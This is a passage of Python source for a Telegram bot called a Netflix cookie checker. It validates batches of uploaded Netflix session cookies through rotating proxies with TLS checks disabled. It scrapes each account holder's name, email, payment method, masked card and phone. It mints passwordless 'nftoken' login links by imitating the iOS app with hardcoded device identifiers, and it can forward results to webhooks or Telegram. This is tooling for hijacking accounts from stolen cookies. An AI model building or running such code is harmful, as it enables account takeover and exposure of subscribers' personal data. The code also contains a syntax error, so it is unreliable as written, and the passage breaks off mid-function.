import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import time
import unicodedata
import zipfile
from datetime import datetime, timedelta, timezone
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN FROM ENVIRONMENT ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    print("Please add BOT_TOKEN in Railway Environment Variables")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False, "email": False, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": False, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": False, "phone": False,
        "quality": True, "hold_status": False, "email_verified": False,
        "membership_status": False, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: false
  email: false
  plan: true
  country: true
  member_since: false
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: false
  phone: false
  hold_status: false
  extra_members: true
  email_verified: false
  membership_status: false
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
bot_application = None
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}

# User sessions for /cancel
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")
    with open(path, "wb") as out_f:
        out_f.write(data)
        out_f.flush()

def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {"\\x20": " ", "\\u00A0": " ", "&nbsp;": " ", "u00A0": " "}
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return value == 1
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    if lowered in {"true", "yes", "1", "on"}:
        return True
    if lowered in {"false", "no", "0", "off"}:
        return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    normalized = normalized.lower()
    return "netflix." in normalized

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True

def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
            netscape_lines.append(line)
    return "\n".join(netscape_lines)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t{entry['expires']}\t{entry['name']}\t{entry['value']}"

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(domain, parts[1], parts[2], parts[3], parts[4], name, parts[6], index))
    return entries

def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(domain, "TRUE" if str(domain).startswith(".") else "FALSE", cookie.get("path", "/"), "TRUE" if cookie.get("secure", False) else "FALSE", cookie.get("expirationDate", cookie.get("expiration", 0)), name, cookie.get("value", ""), index))
    return entries

def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE", "0", cookie_name, value, index))
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    if not entries_by_name:
        return []
    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []
    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])
        if not selected_entries:
            continue
        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append({"index": bundle_index + 1, "total": bundle_count, "netscape_text": netscape_text, "cookies": cookies_dict_from_netscape(netscape_text)})
    return bundles

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain = parts[0]
            name = canonicalize_netflix_cookie_name(parts[5])
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


# ==================== ACCOUNT INFO EXTRACTION ====================

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"']:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    return ", ".join(names) if names else None

def has_complete_account_info(info):
    if not info:
        return False
    required_fields = ("countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality")
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)

def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged

def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data") or {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)
    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())
    
    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": decode_netflix_value(current_plan.get("priceDisplay") or next_plan.get("priceDisplay")),
        "paymentMethodType": decode_netflix_value(payment_method.get("paymentOptionLogo") or growth_account.get("payer")),
        "maskedCard": payment_display_text if "Card" in payment_typename else None,
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": format_boolean_label(hold_meta.get("isUserOnHold")),
        "profiles": ", ".join(profile_names) if profile_names else None,
    }
    return {key: value for key, value in info.items() if value not in (None, "", [], {})}

def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    if has_complete_account_info(graphql_info):
        return dict(graphql_info)
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"', r'"accountOwnerName"\s*:\s*"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T', r'"nextBillingDate"\s*:\s*"([^"]+)"']),
        "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),', r'"maxStreams"\s*:\s*"?([^",}]+)"?']),
        "localizedPlanName": extract_first_match(response_text, [r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"', r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"planPriceDisplay"\s*:\s*"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, [r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', r'"videoQuality"\s*:\s*"([^"]+)"']),
        "profiles": extract_profile_names(response_text),
    }
    return merge_info(graphql_info, extracted)

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def get_canonical_output_label(plan_key):
    canonical_labels = {"premium": "Premium", "standard_with_ads": "Standard With Ads", "standard": "Standard", "basic": "Basic", "mobile": "Mobile", "free": "Free", "duplicate": "Duplicate", "unknown": "Unknown"}
    return canonical_labels.get(plan_key, "Unknown")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    normalized = normalize_plan_key(raw_plan) if raw_plan else ""
    plan_aliases = {
        "premium": {"premium", "premium_extra_member", "extra_member_premium"},
        "standard_with_ads": {"standard_with_ads", "standardwithads", "estandar_con_anuncios"},
        "standard": {"standard", "estandar", "standardowy"},
        "basic": {"basic", "basic_with_ads", "basico"},
        "mobile": {"ponsel", "mobile", "seluler"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)
    streams = info.get("maxStreams")
    if streams is not None:
        try:
            streams = int(str(streams).rstrip("}"))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
            if streams == 1:
                return "basic", "Basic"
        except:
            pass
    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    return status == "current_member"

def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit_flag = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit_flag:
        return explicit_flag.strip().lower() in {"yes", true","1"}
    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    return "extra" in localized_plan.lower() or "miembro extra" in localized_plan.lower()

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = (decode_netflix_value(country_code) or "").strip()
    if not raw:
        return ""
    upper = raw.upper()
    if len(upper) == 2 and upper.isalpha():
        return "".join(chr(127397 + ord(char)) for char in upper)
    return ""

def format_country_with_flag(country_value):
    normalized_country = decode_netflix_value(country_value) or "UNKNOWN"
    country_flag = country_code_to_flag(normalized_country)
    if country_flag:
        return f"{normalized_country} ({country_flag})"
    return normalized_country

def get_nftoken_mode(config):
    raw_value = config.get("nftoken", False)
    if isinstance(raw_value, bool):
        return "both" if raw_value else "false"
    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"false", "off", "none"}:
        return "false"
    if raw_mode in {"pc", "desktop", "computer"}:
        return "pc"
    if raw_mode in {"mobile", "phone"}:
        return "mobile"
    return "both"

def has_usable_nftoken(nftoken_data):
    if not isinstance(nftoken_data, dict):
        return False
    token = decode_netflix_value(nftoken_data.get("token"))
    if not token:
        return False
    return True

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, "Missing required cookies for NFToken"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    for _ in range(attempts):
        try:
            response = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
            if response.status_code != 200:
                continue
            data = response.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = decode_netflix_value(token_data.get("token"))
            if token:
                expires = token_data.get("expires")
                expiry_time = None
                if expires:
                    try:
                        if isinstance(expires, (int, float)):
                            expiry_time = datetime.fromtimestamp(expires, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                        else:
                            expiry_time = str(expires)
                    except:
                        expiry_time = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
                else:
                    expiry_time = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
                return {"token": token, "expires_at_utc": expiry_time}, None
        except:
            continue
    return None, "NFToken API error"

def build_nftoken_links(token, mode):
    normalized_token = decode_netflix_value(token)
    normalized_mode = str(mode or "false").strip().lower()
    if not normalized_token or normalized_mode == "false":
        return []
    if normalized_mode == "pc":
        return [("PC Login", f"https://netflix.com/?nftoken={normalized_token}")]
    if normalized_mode == "mobile":
        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={normalized_token}")]
    return [
        ("PC Login", f"https://netflix.com/?nftoken={normalized_token}"),
        ("Phone Login", f"https://netflix.com/unsupported?nftoken={normalized_token}"),
    ]

def get_account_page(session, proxy=None, request_timeout=15, fallback_account_page=False):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=request_timeout)
    if response.status_code == 200 and response.text:
        info = extract_info(response.text)
        return response.text, response.status_code, info
    return response.text, response.status_code, None

def load_proxies():
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append({"http": line, "https": line})
    return proxies


# ==================== BEAUTIFUL RESULT FORMATTING - NO EMOJIS ====================

def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None):
    if config is None:
        config, _ = load_config()
    
    _, normalized_plan_label = derive_plan_info(info, is_subscribed)
    
    if is_subscribed:
        is_extra = is_extra_member_account(info)
        if is_extra:
            status = "Valid Extra Member Account"
        else:
            status = "Valid Premium Account"
    else:
        status = "Valid Free Account"
    
    name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    email = decode_netflix_value(info.get("email")) or "Unknown"
    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
    country = format_country_with_flag(country_raw)
    
    plan = normalized_plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    payment = decode_netflix_value(info.get("paymentMethodType")) or "Unknown"
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "No"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No" if format_boolean_label(info.get("holdStatus")) != "Yes" else "Yes"
    extra_member = "Yes" if info.get("showExtraMemberSection") == "Yes" else "No"
    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
    membership_status = decode_netflix_value(info.get("membershipStatus")) or "UNKNOWN"
    profiles_count = info.get("profileCount", 0)
    if not profiles_count and info.get("profiles"):
        profiles_count = len(info.get("profiles", "").split(", "))
    profiles = decode_netflix_value(info.get("profilesDisplay")) or decode_netflix_value(info.get("profiles")) or "None"
    
    lines = []
    lines.append("=" * 60)
    lines.append(f"STATUS: {status}")
    lines.append("=" * 60)
    lines.append("")
    lines.append("ACCOUNT DETAILS")
    lines.append("-" * 40)
    lines.append(f"Name: {name}")
    lines.append(f"Email: {email}")
    lines.append(f"Country: {country}")
    lines.append(f"Plan: {plan}")
    
    if is_subscribed:
        if price and price != "N/A":
            lines.append(f"Price: {price}")
        lines.append(f"Member Since: {member_since}")
        lines.append(f"Next Billing: {next_billing}")
        lines.append(f"Payment: {payment}")
        if payment.upper() == "CC" and card != "N/A":
            lines.append(f"Card: {card}")
        lines.append(f"Phone: {phone} ({phone_verified})")
        lines.append(f"Quality: {quality}")
        lines.append(f"Streams: {streams}")
        lines.append(f"Hold Status: {hold}")
        lines.append(f"Extra Member: {extra_member}")
        if extra_member == "Yes":
            lines.append(f"Extra Member Slot: Unknown")
        lines.append(f"Email Verified: {email_verified}")
        lines.append(f"Membership Status: {membership_status}")
    else:
